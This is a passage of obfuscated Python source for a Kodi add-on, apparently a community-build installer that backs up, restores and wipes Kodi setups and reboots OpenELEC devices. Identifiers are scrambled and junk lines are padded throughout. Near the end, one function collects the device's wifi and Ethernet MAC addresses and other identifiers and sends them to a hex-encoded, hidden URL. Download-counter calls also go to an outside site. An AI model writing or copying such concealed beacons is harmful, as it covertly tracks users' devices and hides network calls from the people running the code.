  oOiiI11I1ii11 = open ( os . path . join ( IIi1ii1i1i1 , 'addonlist' ) , mode = 'w+' )
  for iiiiIii11i1 in os . listdir ( ooooooO0oo ) :
   if not iiiiIii11i1 in iIIIi1IiI11I1 and iiiiIii11i1 != 'plugin.program.totalinstaller' and iiiiIii11i1 != 'script.module.addon.common' and iiiiIii11i1 != 'packages' :
    oOiiI11I1ii11 . write ( iiiiIii11i1 + '|' )
  oOiiI11I1ii11 . close ( )
  if I11 == 'true' :
   print "### Created addonlist to: " + os . path . join ( IIi1ii1i1i1 , 'addonlist' )
  o0O00OoOOo = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' , '.cbcfg' ]
  I1i11II11i1iI = "Creating Profile Data File"
  iI1 = "Archiving..."
  I1I1i1i = ""
  OOo0O = "Please Wait"
  IIiIiII ( I1III1iI1II , os . path . join ( IIi1ii1i1i1 , 'build.zip' ) , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
  if I11 == 'true' :
   print "### Created: " + os . path . join ( IIi1ii1i1i1 , 'build.zip' )
   if 40 - 40: OO000 - OooO00OOoO00 / II111iiii * i1IIi + oOO00 * II111iiii
  if IiiIII111iI == 'false' :
   os . remove ( iiIII1i )
   if I11 == 'true' :
    print "### removed: " + iiIII1i
  i1i1 ( i1ii1iIIi11i111I )
  i1iiiIii11 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( I11OoooO )
  if not 'update' in video :
   try :
    o0OO0o0o00o ( i1iiiIii11 )
   except :
    pass
  OO0o . ok ( 'Successfully Updated' , 'Congratulations the following build:[COLOR=dodgerblue]' , description , '[/COLOR]has been successfully updated!' )
  OooOo ( )
  OOoooOOO0 ( IIi1ii1i1i1 )
  if 99 - 99: OO000 - oOO00 - i1IIi / i11iIiiIii . oOO00
  if 58 - 58: Oo
def iiOO0O ( url ) :
 IiiiiIi1iII1 = 0
 Iii1I1 = 0
 print "### Local Build Restore Location: " + url
 if 87 - 87: OoooooooOO - ooOo - o0oOOoo * I1ii11iIi11i
 IioOo0O ( )
 if 44 - 44: ooOo * II111iiii * II111iiii + I1IiiI / Oo0Ooo
 if url == 'local' :
  i1ii1iIIi11i111I = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , oO0Oo )
  if i1ii1iIIi11i111I == '' :
   IiiiiIi1iII1 = 1
   if 9 - 9: Oo0Ooo - oOO00
 if IiiiiIi1iII1 == 1 :
  print "### No file selected, quitting restore process ###"
  return
  if 30 - 30: OoooooooOO % Oo
 if url != 'local' :
  Ooo . create ( "Community Builds" , "Downloading build." , '' , 'Please Wait' )
  i1ii1iIIi11i111I = os . path . join ( oOOoo0Oo , oOo0OO00O0O ( ) + '.zip' )
  if 14 - 14: OoOoOO00 / OoO0O00 / i11iIiiIii - OoOoOO00 / o0oOOo0O0Ooo - Oo
  if not os . path . exists ( oOOoo0Oo ) :
   os . makedirs ( oOOoo0Oo )
   if 81 - 81: OOOOOOoo0O % OO000 . o0oOOoo
  downloader . download ( url , i1ii1iIIi11i111I , Ooo )
  if 66 - 66: I1ii11iIi11i * OO000 / OoooooooOO * O0 % Oo
 if os . path . exists ( O00OOOoOoo0O ) :
  if os . path . exists ( O000OO0 ) :
   os . remove ( O00OOOoOoo0O )
  else :
   os . rename ( O00OOOoOoo0O , O000OO0 )
   if 49 - 49: II111iiii . I1IiiI * O0 * OO000 / i1Ii11i1i * OoooooooOO
 if os . path . exists ( I11iii1Ii ) :
  os . remove ( I11iii1Ii )
  if 82 - 82: Oo0Ooo / OO000 / OO000 % OO000
  if 20 - 20: o0oOOoo
 if not os . path . exists ( OOOO0OOoO0O0 ) :
  iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'w+' )
  if 63 - 63: iIii1I11I1II1 . OoO0O00
 if os . path . exists ( O000OOo00oo ) :
  os . removedirs ( O000OOo00oo )
  if 100 - 100: i1IIi * i1IIi
  if 26 - 26: Oo . OoO0O00 % OoOoOO00
 try :
  os . rename ( O000OO0 , O00OOOoOoo0O )
  if 94 - 94: oOO00
 except :
  OO0o . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
  if 15 - 15: OO000 - oOO00 / O0
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( oOo00O0oo00o0 , 'We highly recommend backing up your existing build before installing any builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if iIiI1 == 0 :
  i1i11iii11 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Community_Builds' , 'My_Builds' ) )
  if 5 - 5: i1Ii11i1i + OOOOOOoo0O % i1Ii11i1i % i11iIiiIii
  if not os . path . exists ( i1i11iii11 ) :
   os . makedirs ( i1i11iii11 )
   if 46 - 46: OoooooooOO
  OO000OOo = oOo0O000Ooo0 ( heading = "Enter a name for this backup" )
  if ( not OO000OOo ) :
   return False , 0
   if 80 - 80: O0 * OOOOOOoo0O
  O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
  OooO00 = xbmc . translatePath ( os . path . join ( i1i11iii11 , O0Oo0O00o0oo0OO + '.zip' ) )
  o0O00OoOOo = [ I1IiI ]
  iIiIIi11iI = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
  I1i11II11i1iI = "Creating full backup of existing build"
  iI1 = "Archiving..."
  I1I1i1i = ""
  OOo0O = "Please Wait"
  if 73 - 73: oOO00 / OO000 + i1Ii11i1i . Oo - II111iiii / iIii1I11I1II1
  IIiIiII ( O0o0Oo , OooO00 , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , o0O00OoOOo , iIiIIi11iI )
 O0oOOO0o0OO0 = xbmcgui . Dialog ( ) . yesno ( oOo00O0oo00o0 , 'Would you like to keep your existing database files or overwrite? Overwriting will wipe any existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if O0oOOO0o0OO0 == 1 :
  if os . path . exists ( ooOOO00Ooo ) :
   shutil . rmtree ( ooOOO00Ooo )
   if 7 - 7: I1ii11iIi11i
  try :
   shutil . copytree ( iIi1ii1I1 , ooOOO00Ooo , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 81 - 81: Oo0Ooo % II111iiii % o0oOOo0O0Ooo / OooO00OOoO00
  except :
   Iii1I1 = xbmcgui . Dialog ( ) . yesno ( oOo00O0oo00o0 , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if Iii1I1 == 1 : pass
   if Iii1I1 == 0 : IiiiiIi1iII1 = 1 ; return
   if 95 - 95: OoOoOO00 - O0 % OoooooooOO
  OooO00 = xbmc . translatePath ( os . path . join ( oO0Oo , 'Database.zip' ) )
  II11i1IiIII ( ooOOO00Ooo , OooO00 )
  if 13 - 13: i11iIiiIii
 if IiiiiIi1iII1 == 1 :
  print "### Chose to exit restore function ###"
  return
  if 54 - 54: Oo . I1ii11iIi11i * OooO00OOoO00 % i1Ii11i1i . O0 * oOO00
 else :
  time . sleep ( 1 )
  IiiIiIIi1 = open ( I1IIIii , mode = 'r' )
  O0OOOOoOOO = IiiIiIIi1 . read ( )
  IiiIiIIi1 . close ( )
  if 87 - 87: OO000 % I1ii11iIi11i * Oo0Ooo
  if 59 - 59: Oo0Ooo / OooO00OOoO00 - iIii1I11I1II1 * iIii1I11I1II1
  print "### Checking zip file structure ###"
  I1iIii1iii11i = zipfile . ZipFile ( i1ii1iIIi11i111I )
  if 'xbmc.log' in I1iIii1iii11i . namelist ( ) or 'kodi.log' in I1iIii1iii11i . namelist ( ) or '.git' in I1iIii1iii11i . namelist ( ) or '.svn' in I1iIii1iii11i . namelist ( ) :
   print "### Whoever created this build has used completely the wrong backup method, lets try and fix it! ###"
   OO0o . ok ( 'Fixing Bad Zip' , 'Whoever created this build has used the wrong backup method, please wait while we fix it - this could take some time! Click OK to proceed' )
   o00oOo0oO0oOO = zipfile . ZipFile ( i1ii1iIIi11i111I , 'r' )
   Oooo0 = os . path . join ( oOOoo0Oo , 'fixed.zip' )
   oOO0o0OO = zipfile . ZipFile ( Oooo0 , 'w' )
   if 91 - 91: i1IIi - I1ii11iIi11i * I1IiiI
   Ooo . create ( "Fixing Build" , "Checking " , '' , 'Please Wait' )
   if 24 - 24: OoOoOO00 * OO000
   for iiiiIii11i1 in o00oOo0oO0oOO . infolist ( ) :
    buffer = o00oOo0oO0oOO . read ( iiiiIii11i1 . filename )
    iI1iiII1iii111 = str ( iiiiIii11i1 . filename )
    if 22 - 22: I1IiiI
    if ( iiiiIii11i1 . filename [ - 4 : ] != '.log' ) and not '.git' in iI1iiII1iii111 and not '.svn' in iI1iiII1iii111 :
     oOO0o0OO . writestr ( iiiiIii11i1 , buffer )
     Ooo . update ( 0 , "Fixing..." , '[COLOR darkcyan]%s[/COLOR]' % iiiiIii11i1 . filename , 'Please Wait' )
     if 76 - 76: OoO0O00 + OooO00OOoO00 + OoO0O00 . OooO00OOoO00 % Oo
   Ooo . close ( )
   oOO0o0OO . close ( )
   o00oOo0oO0oOO . close ( )
   i1ii1iIIi11i111I = Oooo0
   if 96 - 96: Oo0Ooo
  Ooo . create ( "Restoring Backup Build" , "Checking " , '' , 'Please Wait' )
  Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
  if 34 - 34: ooOo - I1ii11iIi11i
  try :
   extract . all ( i1ii1iIIi11i111I , O0o0Oo , Ooo )
  except :
   OO0o . ok ( 'ERROR IN BUILD ZIP' , 'Please contact the build author, there are errors in this zip file that has caused the install process to fail. Most likely cause is it contains files with special characters in the name.' )
   return
   if 10 - 10: Oo . OO000
  time . sleep ( 1 )
  if 5 - 5: oOO00 - OooO00OOoO00
  if O0oOOO0o0OO0 == 1 :
   extract . all ( OooO00 , iIi1ii1I1 , Ooo )
   if 16 - 16: oOO00 . OOOOOOoo0O . Oo0Ooo % Oo / oOO00
   if Iii1I1 != 1 :
    shutil . rmtree ( ooOOO00Ooo )
    if 72 - 72: o0oOOo0O0Ooo * o0oOOoo - i11iIiiIii / OO000
  iiiii1i1 = open ( I1IIIii , mode = 'w+' )
  iiiii1i1 . write ( O0OOOOoOOO )
  iiiii1i1 . close ( )
  try :
   os . rename ( O000OO0 , I11iii1Ii )
   if 18 - 18: OoOoOO00 * OoOoOO00 - o0oOOo0O0Ooo % o0oOOoo % II111iiii - oOO00
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 75 - 75: OoO0O00 . II111iiii . ooOo / OoO0O00 % iIii1I11I1II1
  time . sleep ( 1 )
  iiIi1I1i1 = open ( O00OOOoOoo0O , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
  I1iI1111ii1I1 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( IiiI )
  O0oo00o000 = I1iI1111ii1I1 [ 0 ] if ( len ( I1iI1111ii1I1 ) > 0 ) else ''
  oOIIIi = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( IiiI )
  II1111iiI1II = oOIIIi [ 0 ] if ( len ( oOIIIi ) > 0 ) else ''
  ii1I = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( IiiI )
  OoOOOO00 = ii1I [ 0 ] if ( len ( ii1I ) > 0 ) else ''
  if 8 - 8: O0 / II111iiii
  try :
   i1iI1IIi1I = open ( I11iii1Ii , mode = 'r' )
   oo00i1i11I1I1 = i1iI1IIi1I . read ( )
   i1iI1IIi1I . close ( )
   OoO0000O = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oo00i1i11I1I1 )
   i1iIi1iiii1ii = OoO0000O [ 0 ] if ( len ( OoO0000O ) > 0 ) else ''
   I1I1iI = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oo00i1i11I1I1 )
   oO0oOo = I1I1iI [ 0 ] if ( len ( I1I1iI ) > 0 ) else ''
   IIIOo0O = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oo00i1i11I1I1 )
   IIiIiii = IIIOo0O [ 0 ] if ( len ( IIIOo0O ) > 0 ) else ''
   iiiI1i11Ii = IiiI . replace ( O0oo00o000 , i1iIi1iiii1ii ) . replace ( OoOOOO00 , IIiIiii ) . replace ( II1111iiI1II , oO0oOo )
   oo00IIIIIIIiI = open ( O00OOOoOoo0O , mode = 'w+' )
   oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
   oo00IIIIIIIiI . close ( )
   if 62 - 62: iIii1I11I1II1 % i1Ii11i1i % I1ii11iIi11i * oOO00
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 87 - 87: oOO00
  if os . path . exists ( O000OO0 ) :
   os . remove ( O000OO0 )
   if 45 - 45: ooOo + II111iiii * O0 % Oo . iIii1I11I1II1
  os . rename ( O00OOOoOoo0O , O000OO0 )
  try :
   os . remove ( I11iii1Ii )
   if 55 - 55: oOO00
  except :
   pass
   if 43 - 43: Oo
  os . makedirs ( O000OOo00oo )
  time . sleep ( 1 )
  OOo00O0O ( )
  if 17 - 17: i11iIiiIii
  if 94 - 94: OoooooooOO - oOO00 + ooOo . OoooooooOO / i1IIi
  if 53 - 53: i1Ii11i1i % I1ii11iIi11i
  if 17 - 17: OoooooooOO % OO000 % O0
  if 46 - 46: OOOOOOoo0O + i1Ii11i1i % OoooooooOO * I1ii11iIi11i
  if 89 - 89: oOO00 - oOO00 % OOOOOOoo0O / OooO00OOoO00 + ooOo - oOO00
  if 97 - 97: OO000 % OoOoOO00 / I1ii11iIi11i / iIii1I11I1II1 * OoooooooOO * Oo
  if 80 - 80: ooOo / O0
  if 55 - 55: I1IiiI * OooO00OOoO00 / O0 % OoOoOO00
  if 71 - 71: i11iIiiIii * OoOoOO00 * Oo + ooOo + Oo0Ooo
  if 59 - 59: oOO00
  if 54 - 54: Oo
  if 27 - 27: OoOoOO00 - OoO0O00 + o0oOOo0O0Ooo + o0oOOoo . OoO0O00
  if 86 - 86: II111iiii - OoooooooOO - o0oOOoo % OOOOOOoo0O
  if 16 - 16: o0oOOoo + Oo0Ooo + OoooooooOO
  if 87 - 87: I1IiiI . ooOo / oOO00 - OoooooooOO
  if 33 - 33: ooOo % OoO0O00 . iIii1I11I1II1 / oOO00
  if 3 - 3: OO000 + OoO0O00
  if 60 - 60: OoO0O00 . OoOoOO00 - I1ii11iIi11i - I1IiiI - II111iiii % Oo0Ooo
def oO0Oooo ( ) :
 IioOo0O ( )
 OoO000 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , oO0Oo )
 if 12 - 12: OoOoOO00 / I1IiiI * Oo0Ooo
 if OoO000 == '' :
  return
  if 59 - 59: Oo0Ooo . o0oOOo0O0Ooo % I1IiiI / OoooooooOO % ooOo
 else :
  ooO00 = 1
  IIIii111i ( OoO000 , ooO00 )
  if 81 - 81: OoooooooOO / o0oOOoo * iIii1I11I1II1 . Oo0Ooo + ooOo / O0
  if 84 - 84: II111iiii - o0oOOo0O0Ooo
def oOoOoO0OoOO0 ( name , url , video ) :
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re encountering any issues with your device. This will wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if iIiI1 == 0 :
  return
  if 75 - 75: I1IiiI
 elif iIiI1 == 1 :
  if 99 - 99: o0oOOoo . OO000
  iiIII1i = '/storage/openelec_temp/'
  o000 = '/storage/.restore/'
  i1iOO = os . path . join ( o000 , oOo0OO00O0O ( ) + '.tar' )
  if not os . path . exists ( o000 ) :
   try :
    os . makedirs ( o000 )
   except :
    pass
  try :
   downloader . download ( url , i1iOO )
   o0O00oo0O = True
  except :
   o0O00oo0O = False
  time . sleep ( 2 )
  if 41 - 41: I1ii11iIi11i * i11iIiiIii - Oo0Ooo * II111iiii
  if o0O00oo0O == True :
   if 56 - 56: OoO0O00 / OOOOOOoo0O - OoO0O00 * o0oOOo0O0Ooo - OoOoOO00
   try :
    iiIi1I1i1 = open ( OOOO0OOoO0O0 , mode = 'r' )
    IiiI = iiIi1I1i1 . read ( )
    iiIi1I1i1 . close ( )
    if 73 - 73: iIii1I11I1II1
    IIIII11II1 = re . compile ( 'id="(.+?)"' ) . findall ( IiiI )
    I11OoooO = IIIII11II1 [ 0 ] if ( len ( IIIII11II1 ) > 0 ) else ''
    if 48 - 48: i11iIiiIii - OO000 . OoO0O00
   except :
    pass
   if I11OoooO != '' :
    i1iiiIii11 = 'http://noobsandnerds.com/TI/Community_Builds/downloadcount.php?id=%s' % ( I11OoooO )
   try :
    o0OO0o0o00o ( i1iiiIii11 )
   except :
    pass
    if 89 - 89: i1IIi
    if 92 - 92: iIii1I11I1II1 * I1ii11iIi11i
   if not os . path . exists ( iiIII1i ) :
    try :
     os . makedirs ( iiIII1i )
    except :
     pass
     if 5 - 5: o0oOOoo - i1Ii11i1i - OOOOOOoo0O
   OO0o . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot, if it hasn\'t rebooted within 30 seconds please pull the power to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
   xbmc . executebuiltin ( 'Reboot' )
   if 38 - 38: iIii1I11I1II1 . OO000
   if 12 - 12: OoO0O00 - I1IiiI + OoooooooOO + OoooooooOO * I1IiiI - i1IIi
def OoOOOO0 ( ) :
 IiiiiIi1iII1 = 0
 iIiI1 = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option if you\'re encountering any issues with your device. This will wipe all your Kodi settings and restore with whatever is in the backup, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if iIiI1 == 0 :
  return
  if 33 - 33: I1IiiI - OOOOOOoo0O . i1IIi / i11iIiiIii
 elif iIiI1 == 1 :
  i1ii1iIIi11i111I = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.tar' , False , False , I1I1IiI1 )
  if i1ii1iIIi11i111I == '' :
   IiiiiIi1iII1 = 1
   if 84 - 84: OooO00OOoO00 / OoooooooOO / oOO00 % OooO00OOoO00 . Oo + i1Ii11i1i
  if IiiiiIi1iII1 == 1 :
   print "### No file selected, quitting restore process ###"
   return
  i1iOO = os . path . join ( III1iII1I1ii , oOo0OO00O0O ( ) + '.tar' )
  if not os . path . exists ( III1iII1I1ii ) :
   try :
    os . makedirs ( III1iII1I1ii )
   except :
    pass
  Ooo . create ( 'Copying File To Restore Folder' , '' , 'Please wait...' )
  shutil . copyfile ( i1ii1iIIi11i111I , i1iOO )
  xbmc . executebuiltin ( 'Reboot' )
  if 94 - 94: OooO00OOoO00
  if 48 - 48: ooOo - OoooooooOO + o0oOOo0O0Ooo % i1IIi - I1IiiI + Oo
def oo0O0oO0o ( ) :
 oo0ooooo00o ( )
 if IioO0O ( ) :
  IiII111i1i11 ( '' , '[COLOR=dodgerblue]Restore a locally stored OpenELEC Backup[/COLOR]' , '' , 'restore_local_OE' , 'Restore.png' , '' , '' , 'Restore A Full OE System Backup' )
  if 37 - 37: O0
 IiII111i1i11 ( '' , '[COLOR=dodgerblue]Restore A Locally stored build[/COLOR]' , 'local' , 'restore_local_CB' , 'Restore.png' , '' , '' , 'Restore A Full System Backup' )
 IiII111i1i11 ( '' , '[COLOR=dodgerblue]Restore Local guisettings file[/COLOR]' , 'url' , 'LocalGUIDialog' , 'Restore.png' , '' , '' , 'Back Up Your Full System' )
 if 34 - 34: oOO00
 if os . path . exists ( os . path . join ( oO0Oo , 'addons.zip' ) ) :
  IiII111i1i11 ( '' , 'Restore Your Addons' , 'addons' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addons' )
  if 5 - 5: OoO0O00 . I1IiiI
 if os . path . exists ( os . path . join ( oO0Oo , 'addon_data.zip' ) ) :
  IiII111i1i11 ( '' , 'Restore Your Addon UserData' , 'addon_data' , 'restore_zip' , 'Restore.png' , '' , '' , 'Restore Your Addon UserData' )
  if 48 - 48: Oo0Ooo - OoO0O00 . OooO00OOoO00 - iIii1I11I1II1 % OO000
 if os . path . exists ( os . path . join ( oO0Oo , 'guisettings.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore Guisettings.xml' , O000OO0 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your guisettings.xml' )
  if 47 - 47: OOOOOOoo0O / OoooooooOO - II111iiii
 if os . path . exists ( os . path . join ( oO0Oo , 'favourites.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore Favourites.xml' , OOOOi11i1 , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your favourites.xml' )
  if 91 - 91: OoOoOO00 + o0oOOo0O0Ooo
 if os . path . exists ( os . path . join ( oO0Oo , 'sources.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore Source.xml' , IIIii1II1II , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your sources.xml' )
  if 23 - 23: i1IIi
 if os . path . exists ( os . path . join ( oO0Oo , 'advancedsettings.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore Advancedsettings.xml' , i1I1iI , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your advancedsettings.xml' )
  if 9 - 9: i1IIi % i1Ii11i1i - OoO0O00 * OoOoOO00 . o0oOOo0O0Ooo
 if os . path . exists ( os . path . join ( oO0Oo , 'keyboard.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore Advancedsettings.xml' , I11i1I1I , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your keyboard.xml' )
  if 18 - 18: OO000 . OoOoOO00 + OOOOOOoo0O . I1IiiI + OoooooooOO . OoO0O00
 if os . path . exists ( os . path . join ( oO0Oo , 'RssFeeds.xml' ) ) :
  IiII111i1i11 ( '' , 'Restore RssFeeds.xml' , o0OO00oO , 'resore_backup' , 'Restore.png' , '' , '' , 'Restore Your RssFeeds.xml' )
  if 31 - 31: i1Ii11i1i - OooO00OOoO00
  if 49 - 49: iIii1I11I1II1 - iIii1I11I1II1 - OoOoOO00 + oOO00 / OoOoOO00
def oo0Ooo ( url ) :
 IioOo0O ( )
 if 'addons' in url :
  iI1II1III = xbmc . translatePath ( os . path . join ( oO0Oo , 'addons.zip' ) )
  OOO = ooooooO0oo
  if 48 - 48: i1IIi - OooO00OOoO00 * OooO00OOoO00 . o0oOOo0O0Ooo
 else :
  iI1II1III = xbmc . translatePath ( os . path . join ( oO0Oo , 'addon_data.zip' ) )
  OOO = O0O
  if 41 - 41: OoooooooOO * II111iiii / OO000 * II111iiii
 if 'Backup' in oOo00O0oo00o0 :
  OO00OoOO ( )
  Ooo . create ( "Creating Backup" , "Backing Up" , '' , 'Please Wait' )
  Ooo00o0oOo0O0O = zipfile . ZipFile ( iI1II1III , 'w' , zipfile . ZIP_DEFLATED )
  oO0ooOO = len ( OOO )
  iii1iII1 = [ ]
  oO0O000oOo = [ ]
  for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( OOO ) :
   for file in III1I11i1iIi :
    oO0O000oOo . append ( file )
  iiii111IiIIi1 = len ( oO0O000oOo )
  for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( OOO ) :
   for file in III1I11i1iIi :
    iii1iII1 . append ( file )
    iIIiI1iiI = len ( iii1iII1 ) / float ( iiii111IiIIi1 ) * 100
    Ooo . update ( int ( iIIiI1iiI ) , "Backing Up" , '[COLOR darkcyan]%s[/COLOR]' % file , 'Please Wait' )
    I11Ii111I = os . path . join ( oo0o , file )
    if not 'temp' in o0IiiiI111I :
     if not I1IiI in o0IiiiI111I :
      import time
      oOO0OO = '01/01/1980'
      OO0OoOo0OOO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I11Ii111I ) ) )
      if OO0OoOo0OOO > oOO0OO :
       Ooo00o0oOo0O0O . write ( I11Ii111I , I11Ii111I [ oO0ooOO : ] )
  Ooo00o0oOo0O0O . close ( )
  Ooo . close ( )
  OO0o . ok ( "Backup Complete" , "You Are Now Backed Up" , '' , '' )
  if 76 - 76: OooO00OOoO00 % OoO0O00 - oOO00 - oOO00 % OooO00OOoO00 / I1IiiI
 else :
  Ooo . create ( "Extracting Zip" , "Checking " , '' , 'Please Wait' )
  Ooo . update ( 0 , "" , "Extracting Zip Please Wait" )
  extract . all ( iI1II1III , OOO , Ooo )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UpdateLocalAddons ' )
  xbmc . executebuiltin ( "UpdateAddonRepos" )
  if 52 - 52: OOOOOOoo0O % iIii1I11I1II1 . I1ii11iIi11i + ooOo % OOOOOOoo0O * OOOOOOoo0O
  if 'Backup' in oOo00O0oo00o0 :
   OO0o . ok ( "Install Complete" , 'Kodi will now close. Just re-open Kodi and wait for all the updates to complete.' )
   OOo00O0O ( )
   if 83 - 83: ooOo - i1Ii11i1i
  else :
   OO0o . ok ( "SUCCESS!" , "You Are Now Restored" , '' , '' )
   if 46 - 46: i11iIiiIii
   if 33 - 33: o0oOOoo / OOOOOOoo0O * OO000 % i1IIi
def IIIi1IiI ( url ) :
 xbmc . executebuiltin ( 'RunAddon(' + url + ')' )
 if 76 - 76: O0 . o0oOOoo / o0oOOo0O0Ooo + i1Ii11i1i / oOO00 - i11iIiiIii
 if 80 - 80: OOOOOOoo0O * OOOOOOoo0O - OoO0O00 * I1ii11iIi11i
def I1II11IIi11i ( title ) :
 i1Ii1i1iI11I = ''
 Iii1i1Ii = xbmc . Keyboard ( i1Ii1i1iI11I , title )
 Iii1i1Ii . doModal ( )
 if Iii1i1Ii . isConfirmed ( ) :
  i1Ii1i1iI11I = Iii1i1Ii . getText ( ) . replace ( ' ' , '%20' )
  if i1Ii1i1iI11I == None :
   return False
 return i1Ii1i1iI11I
 if 75 - 75: OoooooooOO % i11iIiiIii % iIii1I11I1II1 % I1ii11iIi11i / i11iIiiIii
 if 96 - 96: o0oOOoo * ooOo / iIii1I11I1II1 / OooO00OOoO00
def i1111ii1 ( url ) :
 OO000OOo = oOo0O000Ooo0 ( heading = "Search for add-ons" )
 if 30 - 30: O0 / Oo + OoOoOO00 % OoO0O00 + i1Ii11i1i
 if ( not OO000OOo ) : return False , 0
 if 8 - 8: I1ii11iIi11i - i1IIi - ooOo / ooOo % o0oOOo0O0Ooo
 if 98 - 98: OoO0O00 * o0oOOoo + i1IIi + oOO00 - i1IIi % OoOoOO00
 O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 url += O0Oo0O00o0oo0OO
 oO00O0o0oOOO ( url )
 if 19 - 19: iIii1I11I1II1 * Oo0Ooo / Oo
 if 5 - 5: o0oOOo0O0Ooo
def i1II1Ii ( url ) :
 OO000OOo = oOo0O000Ooo0 ( heading = "Search for content" )
 if 92 - 92: Oo0Ooo - II111iiii
 if 7 - 7: i11iIiiIii + o0oOOoo . i1Ii11i1i + i1IIi - o0oOOo0O0Ooo
 if ( not OO000OOo ) : return False , 0
 if 82 - 82: II111iiii + o0oOOoo * Oo . iIii1I11I1II1 - i11iIiiIii * iIii1I11I1II1
 if 42 - 42: o0oOOo0O0Ooo * ooOo . Oo
 O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 url += O0Oo0O00o0oo0OO
 I1Io0OO ( url )
 if 46 - 46: I1ii11iIi11i - i1Ii11i1i % I1ii11iIi11i - i11iIiiIii
 if 50 - 50: i1Ii11i1i % oOO00
def OoOOOoo ( ) :
 OO000OOo = oOo0O000Ooo0 ( heading = 'Enter item to search for' )
 if 97 - 97: OooO00OOoO00
 if ( not OO000OOo ) : return False , 0
 if 84 - 84: oOO00 - OoOoOO00 . oOO00 + o0oOOoo . OOOOOOoo0O
 if 96 - 96: OO000 % OOOOOOoo0O * OO000 % I1IiiI . o0oOOo0O0Ooo / o0oOOo0O0Ooo
 O0Oo0O00o0oo0OO = urllib . quote_plus ( OO000OOo )
 i11I1Ii1Iiii1 ( O0Oo0O00o0oo0OO )
 if 7 - 7: OoO0O00 - o0oOOoo % i1IIi
def iI1i1IIi1i1 ( ) :
 IiII1111I = o00OoOOoO ( 'wifi' )
 iiIIii111Ii = o00OoOOoO ( 'eho0' )
 OO000oooOo000 = iIiiII ( )
 o0oO0o0Oo0 = Ii1 ( )
 OOoOOO = IiII1111I + '&' + OO000oooOo000 + '&' + o0oO0o0Oo0 + '&' + iiIIii111Ii . replace ( ' ' , '%20' )
 i11i1ii1I = o0OO0o0o00o ( iII11 ( 'd' , '6773736f392e2e736b61612d6c642e7264736d6e6d642d6f676f3e773c011510030A' ) + iII11 ( 'e' , OOoOOO ) )
 if 88 - 88: iIii1I11I1II1 / II111iiii . i11iIiiIii / Oo / oOO00 / oOO00
 if 62 - 62: OoOoOO00 + OO000 . O0 . Oo % OOOOOOoo0O
def II1OO ( ) :
 oo0OOO0O0 = 'RMT'
 i111iIi1i1 ( )
 o0IiIiI111IIII1 ( )
 if 99 - 99: i1IIi - O0 / II111iiii + II111iiii . oOO00 / ooOo
 if 22 - 22: OOOOOOoo0O . OoooooooOO . Oo0Ooo
